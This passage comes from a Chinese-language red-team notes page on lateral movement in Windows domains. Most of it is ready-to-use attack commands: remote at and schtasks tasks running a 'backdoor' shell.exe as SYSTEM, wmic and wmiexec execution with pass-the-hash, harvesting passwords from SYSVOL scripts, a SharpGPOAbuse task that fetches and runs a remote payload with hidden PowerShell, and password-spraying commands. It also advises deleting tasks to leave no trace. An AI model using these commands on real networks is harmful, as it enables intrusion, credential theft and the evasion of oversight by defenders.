copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件
tasklist /S 192.168.183.130 /U administrator /P liu78963 列出某IP上的进程信息，/U指定哪个用户执行该命令，/p指定该用户密码
net use \\IP /del /y 删除链接
net use 查看已建立的ipc链接
</code></pre>
<h3 id="ipc_2">利用ipc横向移动</h3>
<h4 id="at">at</h4>
<pre><code class="language-纯文本">at \\192.168.183.130 17:05:00 cmd.exe /c &quot;&lt;命令&gt;&quot;
at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot;
</code></pre>
<p>关于时间的获得，可以使用 net time \\IP 获得。</p>
<p>计划任务执行后需要删除，不留痕迹</p>
<pre><code class="language-纯文本">at \\192.168.183.130 1 /delete  //1为任务的ID
</code></pre>
<p>关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等</p>
<h4 id="schtasks"><strong>schtasks</strong></h4>
<p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。</p>
<p>横向移动的大致思路与at差不多。</p>
<pre><code class="language-纯文本">在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。
schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f 

但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上/u和/p参数分别设置高权限用户名和密码 
schtasks /create /s 192.168.183.130 /u username /p password /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f

另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上/u /p参数）
schtasks /run /s 192.168.183.130 /i /tn backdoor  // i：忽略任何限制立即运行任务

计划任务执行后需要清理痕迹
schtasks /delete /s 192.168.183.130 /tn &quot;backdoor&quot; /f
</code></pre>
<h4 id="sc">sc</h4>
<p>这个命令可以操控服务。</p>
<pre><code class="language-纯文本">sc \\[主机名/IP] create [servicename] binpath= &quot;[path]&quot;   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令
sc \\[host] start [servicename] 启动某个服务
sc \\[host] delete [servicename]   #删除服务
</code></pre>
<h2 id="wmi">wmi</h2>
<p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。</p>
<p>通过wmic在远程主机上开启进程</p>
<pre><code class="language-纯文本">wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create &quot;command&quot;
</code></pre>
<h3 id="wmiexec">wmiexec</h3>
<p>通过wmic创建远程进程时，不会有回显，需要通过ipc\$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。</p>
<p>wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。
(exe版本网上似乎很不好找) 这里用python版本，下载链接<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，" title="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，</a> impacket按照网上安装来弄就行了
1.环境linux，我们配置好proxychanis代入内网（略
2.proxychains wmiexec.py 域名/用户名:密码@ip  获得shell
3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP</p>
<p>效果图</p>
<p><img alt="image-20210226204713405" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" title="image-20210226204713405" /></p>
<h2 id="winrm">winrm</h2>
<p>​   winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。
​   适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p>
<p>我们可以通过如下powershell命令查看机器上的winrm是否正常运行</p>
<pre><code class="language-纯文本">Get-WmiObject -Class win32_service | Where-Object {$_.name -like &quot;WinRM&quot;}
</code></pre>
<p><img alt="image-20210226223701342" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png" title="image-20210226223701342" /></p>
<p>若没开启，你可以在管理员权限下执行以下指令开启</p>
<pre><code class="language-纯文本">winrm quickconfig -q
or
Enable-PSRemoting -Force
</code></pre>
<p>远程命令执行</p>
<pre><code class="language-纯文本">winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami
</code></pre>
<h2 id="_18">利用组策略</h2>
<h3 id="_19">读取脚本中的密码</h3>
<p>假设域管想通过组策略来修改用户密码，如果他不使用GPP，那么他只有通过GPO配合脚本下发的方式来修改用户密码。</p>
<p>这种脚本可能会长得像这样</p>
<pre><code class="language-纯文本">strComputer = &quot;.&quot;
Set objUser = GetObject(&quot;WinNT://&quot; &amp; strComputer &amp; &quot;/Administrator, user&quot;)
objUser.SetPassword &quot;123QWEQWE!@#&quot;
objUser.SetInfo
</code></pre>
<p>保存这个脚本为<code>cpass.vbs</code>,这个脚本的作用就是修改本地管理员账户的密码为</p>
<pre><code class="language-纯文本">123QWEQWE!@#
</code></pre>
<p>然后通过GPO下发此脚本，该脚本就会被保存于SYSVOL文件夹中。
又因为域中任何用户都可以读取SYSVOL文件夹中内容，所以我们指不定就会翻到这种暴露明文密码的脚本。</p>
<pre><code class="language-纯文本">for /r \\dc/sysvol %i in (*.vbs) do @echo %i
for /r \\dc/sysvol %i in (*.bat) do @echo %i
</code></pre>
<p>但是有些时候密码会被加密，可以用此工具解决<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" title="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a><strong>修复：打了补丁KB2962486后，无法在组策略中设置用户名密码。</strong></p>
<h3 id="_20">批量密码</h3>
<p>域管可能会用组策略批量修改域中用户密码（特别是本地管理员）。所以拿到一个本地管理员密码后不妨试试密码复用，指不定就有惊喜</p>
<h3 id="_21">组策略下发计划任务进行横向移动</h3>
<p>有时候拿下域管，但是目标机器有防火墙等原因不能直接smb或者wmi访问。此时可用组策略下发木马进行横向移动。</p>
<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse" title="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p>
<p>c#程序，在cs上可以通过execute-assembly来内存执行，免杀性++。</p>
<pre><code class="language-纯文本">    #加载GroupPolicy模块 （win7没有，win10有）
Import-Module GroupPolicy

    #创建一个GPO并将GPO链接到域test.local，需要域管权限。
new-gpo -name TestGPO | new-gplink -Target &quot;dc=test,dc=local&quot;

    #添加定时任务 --TargetDnsName指定计算机
SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Update2&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c calc.exe&quot; --GPOName &quot;TestGPO2&quot; --FilterEnabled --TargetDnsName PC-jack-0day.0day.org

    # cs版本
    execute-assembly F:\\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Update2&quot; --Author demo\\administrator --Command &quot;cmd.exe&quot; --Arguments &quot;/c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.1/payload.ps1'))\&quot;&quot; --GPOName &quot;TestGP02&quot; --FilterEnabled --TargetDnsName 192.168.40.148


    #强制更新组策略使组策略立即生效，或者默认等待90分钟等待组策略自己更新
gpupdate /force

    #删除GPO
Remove-GPO -Name TestGPO2

</code></pre>
<h2 id="_22">密码喷洒</h2>
<p><a href="https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1" title="https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1">https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1</a></p>
<pre><code class="language-纯文本">
powershell -exec bypass
Import-Module .\Invoke-DomainPasswordSprayOutsideTheDomain.ps1
使⽤单个密码
Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain &quot;10.10.10.10/DC=redteam,DC=com&quot; -Password admin!@#45
使用密码文件
Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain &quot;192.168.1.1/DC=test,DC=com&quot; -PasswordList passlist.txt -OutFile sprayed-creds.txt
如果不加userlist参数，就会怎么获取域内用户名进行喷洒
</code></pre>
<p><a href="https://github.com/dafthack/DomainPasswordSpray" title="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<pre><code class="language-纯文本">自动收集域内用户然后喷洒
Invoke-DomainPasswordSpray -Password Spring2017

用账户名文件和密码文件
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

</code></pre>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        提权
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/" class="btn btn-xs btn-link">
        printnightmare（CVE-2021-1675）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>